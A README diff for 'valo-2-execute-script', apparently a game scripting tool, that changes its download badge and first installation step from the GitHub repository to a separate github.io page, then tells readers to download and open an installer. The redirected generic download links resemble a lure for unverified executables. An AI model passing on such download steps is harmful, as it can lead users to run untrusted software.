@@ -1,6 +1,6 @@
 # 🛠️ valo-2-execute-script - Manage game settings with smart automation
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/mertak1207/valo-2-execute-script)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://mertak1207.github.io)
 
 ## 📋 What this tool does
 
@@ -20,7 +20,7 @@ Before you install the tool, make sure your computer meets these requirements:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the download page: [https://github.com/mertak1207/valo-2-execute-script](https://github.com/mertak1207/valo-2-execute-script).
+1. Visit the download page: [https://mertak1207.github.io](https://mertak1207.github.io).
 2. Look for the latest version under the Releases section.
 3. Click the link to download the installer file to your computer.
 4. Open the downloaded file to start the installation.
